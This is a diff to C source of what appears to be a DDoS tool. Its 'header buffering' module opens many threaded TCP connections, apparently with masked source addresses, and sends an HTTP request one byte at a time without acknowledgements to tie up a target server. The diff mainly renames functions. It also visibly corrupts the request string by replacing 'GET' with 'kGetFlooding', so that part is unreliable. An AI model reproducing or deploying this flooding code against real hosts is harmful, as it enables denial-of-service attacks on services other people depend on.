@@ -5,8 +5,8 @@
 #include "base/time_check.h"
 #include "ddos/header_buffering.h"
 
-#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
-#define GET_METHOD_LEN 50
+#define kGetFlooding_METHOD "kGetFlooding / HTTP/1.1\r\nHost: localhost\r\n\r\n"
+#define kGetFlooding_METHOD_LEN 50
 extern int g_num_threads;
 
 // session counting
@@ -25,7 +25,7 @@ struct timespec g_headbuf_before_time;
 struct timespec g_headbuf_now_time;
 
 
-void header_buffering_print_usage(void)
+void HeaderBufferingPrintUsage(void)
 {
 	printf(
 			"header buffering Usage : "
@@ -33,7 +33,7 @@ void header_buffering_print_usage(void)
 	return;
 }
 
-void *generate_header_buffering(void *data)
+void *GenerateHeaderBuffering(void *data)
 {
 	int thread_id = *((int*) data);
 	//make tcp connection
@@ -42,8 +42,8 @@ void *generate_header_buffering(void *data)
 	int head_buffering_cnt=0;
 	int index=0;
 
-	char get_method[GET_METHOD_LEN];
-	strcpy(get_method,"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n");
+	char get_method[kGetFlooding_METHOD_LEN];
+	strcpy(get_method,"kGetFlooding / HTTP/1.1\r\nHost: localhost\r\n\r\n");
 
 	int get_method_len = strlen(get_method);
 
@@ -53,11 +53,11 @@ void *generate_header_buffering(void *data)
 		// making tcp connection
 
 		// get now resource
-		get_masking_arguments(&g_headbuf_input, &g_headbuf_now);
+		GetMaskingArguments(&g_headbuf_input, &g_headbuf_now);
 		if(head_buffering_cnt % get_method_len==0)
 		{
 			if(sock!=-1) close(sock);
-			sock = tcp_make_connection(
+			sock = MakeTcpConnection(
 					inet_addr(g_headbuf_now.src),
 					inet_addr(g_headbuf_now.dest),
 					&src_port,
@@ -74,14 +74,14 @@ void *generate_header_buffering(void *data)
 			pthread_cond_wait(&g_headbuf_cond, &g_headbuf_mutex);
 		}
 		// time checking
-		time_check(
+		TimeCheck(
 				&g_headbuf_cond,
 				&g_headbuf_before_time,
 				&g_headbuf_now_time,
 				&g_headbuf_num_generated_in_sec);
 		// send
 		char data = get_method[index];
-		tcp_socket_send_data_no_ack(
+		TckSocketSendDataWithoutAck(
 				sock,
 				inet_addr(g_headbuf_now.src),
 				inet_addr(g_headbuf_now.dest),
@@ -104,11 +104,11 @@ void *generate_header_buffering(void *data)
 	return NULL;
 }
 
-void *header_buffering_time_check(void *data)
+void *HeaderBufferingTimeCheck(void *data)
 {
 	while (1) {
 		pthread_mutex_lock(&g_headbuf_mutex);
-		time_check(
+		TimeCheck(
 				&g_headbuf_cond,
 				&g_headbuf_before_time,
 				&g_headbuf_now_time,
@@ -118,7 +118,7 @@ void *header_buffering_time_check(void *data)
 	return NULL;
 }
 
-void header_buffering_main(char *argv[])
+void HeaderBufferingMain(char *argv[])
 {
 
 	int argc = 0;
@@ -126,10 +126,10 @@ void header_buffering_main(char *argv[])
 		argc++;
 	}
 	if (argc != 4) {
-		header_buffering_print_usage();
+		HeaderBufferingPrintUsage();
 		return;
 	}
-	argv_to_input_arguments(argv, &g_headbuf_input);
+	ArgvToInputArguments(argv, &g_headbuf_input);
 	g_headbuf_num_generated_in_sec = 0;
 	g_headbuf_num_total = 0;
 	memset(&g_headbuf_before_time, 0, sizeof(struct timespec));
@@ -148,10 +148,10 @@ void header_buffering_main(char *argv[])
 		pthread_create(
 				&threads[i],
 				NULL,
-				generate_header_buffering,
+				GenerateHeaderBuffering,
 				(void *)&thread_ids[i]);
 	}
-	pthread_create(&threads[i], NULL, header_buffering_time_check, NULL);
+	pthread_create(&threads[i], NULL, HeaderBufferingTimeCheck, NULL);
 	for (int i = 0; i < num_threads; i++) {
 		pthread_join(threads[i], NULL);
 		printf("threads %d joined\n", i);
